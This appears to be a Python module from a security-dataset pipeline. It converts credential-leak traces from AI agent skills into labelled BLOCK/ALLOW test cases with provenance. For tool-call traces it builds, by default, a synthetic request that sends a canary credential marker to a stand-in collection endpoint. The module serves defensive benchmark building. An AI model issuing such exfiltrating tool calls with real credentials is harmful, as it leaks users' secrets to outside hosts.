"""Deterministic projection: CredentialTrace -> SecurityCase (guide §26-§28).

Real DYNAMIC_TRACE:
  stdout DIRECT   -> TOOL_RESULT A/original
  network PROJECTED -> TOOL_CALL B/deterministic_projection

Synthetic CATALOG_DERIVED:
  either visibility -> C/catalog_derived (never Core)

Validation:
  credential_markers non-empty => leakage_expected != UNSET
  BLOCK synthetic => flow_class+sink+marker present, dynamic_confirmed is False
  BLOCK dynamic   => also requires dynamic_confirmed True
  ALLOW => authorized_sink or safe_redaction
"""
from __future__ import annotations

import hashlib
import json
from typing import Any

from ...core.enums import ExpectedAction, LeakageExpectation
from ...core.models import SecurityCase
from ..quality import SourceProvenance, attach_provenance
from .models import CredentialTrace


def _norm_sha(text: str) -> str:
    from ..dedup import normalize_text

    return hashlib.sha256(normalize_text(text).encode("utf-8", errors="replace")).hexdigest()


def _raw_sha(text: str) -> str:
    return hashlib.sha256((text or "").encode("utf-8", errors="replace")).hexdigest()


def _validate(
    *,
    trace: CredentialTrace,
    expected_action: ExpectedAction,
    leakage_expected: LeakageExpectation,
    credential_markers: list[str],
) -> list[str]:
    errs: list[str] = []
    if credential_markers and leakage_expected == LeakageExpectation.UNSET:
        errs.append("credential_markers non-empty but leakage_expected is UNSET")
    if expected_action == ExpectedAction.BLOCK:
        if not trace.flow_class:
            errs.append("BLOCK: flow_class required")
        if not trace.sink:
            errs.append("BLOCK: sink required")
        if not trace.credential_marker:
            errs.append("BLOCK: credential_marker required")
        if getattr(trace, "evidence_type", "") == "DYNAMIC_TRACE" and expected_action == ExpectedAction.BLOCK and not bool(getattr(trace, "dynamic_confirmed", False)):
            errs.append("DYNAMIC_TRACE BLOCK requires dynamic_confirmed=true")
    else:  # ALLOW
        meta = trace.metadata or {}
        authorized = bool(meta.get("authorized_sink") or meta.get("authorized"))
        safe = bool(meta.get("safe_redaction") or meta.get("redacted"))
        if not (authorized or safe):
            errs.append("ALLOW: need authorized_sink or safe_redaction")
    return errs


def project_trace_to_case(
    trace: CredentialTrace,
    *,
    dataset_id: str = "credential_traces",
    source_revision: str = "",
    raw_sha256: str = "",
    adapter_version: str = "1.0.0",
    expected_action: ExpectedAction = ExpectedAction.BLOCK,
    leakage_expected: LeakageExpectation = LeakageExpectation.NO_LEAK,
    presentation_style: str = "explicit",
    threat_id: str = "",
    project_id: str = "P4_credential_flow",
) -> SecurityCase:
    channel = trace.gateway_channel.lower()
    ea = ExpectedAction.from_value(expected_action)
    le = LeakageExpectation.from_value(leakage_expected)
    markers = [trace.credential_marker] if trace.credential_marker else []
    errs = _validate(trace=trace, expected_action=ea, leakage_expected=le, credential_markers=markers)
    if errs:
        raise ValueError("; ".join(errs))

    source_id = f"skillleak:{trace.skill_id}:{trace.issue_id}:{trace.trace_id}:{trace.sink}"
    group_id = trace.skill_id or trace.trace_id

    content = trace.payload or ""
    tool_name = trace.tool_name
    tool_args: dict[str, Any] = dict(trace.tool_arguments or {})
    tool_result = ""
    m_target = ""
    m_op = ""

    if channel == "tool_result":
        tool_result = content
        if not tool_name:
            tool_name = trace.skill_name or "skill_tool"
    elif channel == "tool_call":
        if not tool_name:
            tool_name = trace.tool_name or "http_request"
        if not tool_args:
            tool_args = {"destination": trace.destination or "https://api.example/collect", "payload": trace.credential_marker}
            if ea == ExpectedAction.BLOCK and trace.credential_marker and not any(trace.credential_marker in str(v) for v in tool_args.values()):
                tool_args["leak"] = trace.credential_marker
        content = json.dumps({"tool": tool_name, "arguments": tool_args}, ensure_ascii=False, sort_keys=True)
        if trace.destination:
            tool_args.setdefault("destination", trace.destination)

    if channel == "tool_result":
        operation = "read"
        direction = "inbound"
    else:
        operation = "execute_tool" if channel == "tool_call" else "send_data"
        direction = "outbound" if channel in ("tool_call", "memory_write") else "inbound"

    # Quality is dictated by evidence type, not visibility.
    evidence_type = getattr(trace, "evidence_type", "CATALOG_DERIVED") or "CATALOG_DERIVED"
    if evidence_type == "DYNAMIC_TRACE":
        if trace.gateway_visibility == "DIRECT":
            quality = "A"
            derivation = "original"
        else:
            quality = "B"
            derivation = "deterministic_projection"
    else:
        quality = "C"
        derivation = "catalog_derived"

    base = SecurityCase.build(
        dataset_id=dataset_id,
        source_id=source_id,
        channel=channel,
        operation=operation,
        direction=direction,
        content=content,
        expected_action=ea,
        project_id=project_id,
        threat_id=threat_id or trace.pattern.lower().replace(" ", "_"),
        user_intent=trace.skill_name or "",
        tool_name=tool_name,
        tool_arguments=tool_args,
        tool_result=tool_result,
        credential_markers=markers,
        leakage_expected=le,
        presentation_style=presentation_style,
        memory_target=m_target,
        memory_operation=m_op,
        metadata={
            "skill_id": trace.skill_id,
            "skill_name": trace.skill_name,
            "issue_id": trace.issue_id,
            "academic_code": trace.academic_code,
            "pattern": trace.pattern,
            "classification": trace.classification,
            "severity": trace.severity,
            "flow_class": trace.flow_class,
            "gateway_visibility": trace.gateway_visibility,
            "evidence_type": evidence_type,
            "sink": trace.sink,
            "derived_channel": trace.gateway_channel,
            "credential_kind": "fake_canary",
            "dynamic_confirmed": bool(trace.dynamic_confirmed),
            "source_revision": trace.source_revision or source_revision,
            "sandbox_version": trace.sandbox_version,
            "trace_id": trace.trace_id,
            "trace_hash": trace.trace_hash,
            "quality_tier": quality,
            "derivation": derivation,
            **{k: v for k, v in (trace.metadata or {}).items() if k in ("authorized_sink", "authorized", "safe_redaction", "redacted")},
            "trace_destination": trace.destination,
        },
    )

    prov = SourceProvenance(
        source_dataset=dataset_id,
        source_revision=source_revision or trace.source_revision or "",
        source_id=source_id,
        group_id=group_id,
        raw_sha256=raw_sha256 or _raw_sha(content),
        normalized_sha256=_norm_sha(content),
        adapter_name="credential_catalog_synthetic" if evidence_type == "CATALOG_DERIVED" else "credential_traces",
        adapter_version=adapter_version,
        quality_tier=quality,
        derivation=derivation,
    )
    d = base.to_dict()
    meta = dict(d.get("metadata") or {})
    meta["group_id"] = group_id
    d["metadata"] = meta
    base = SecurityCase.from_dict(d)
    return attach_provenance(base, prov)
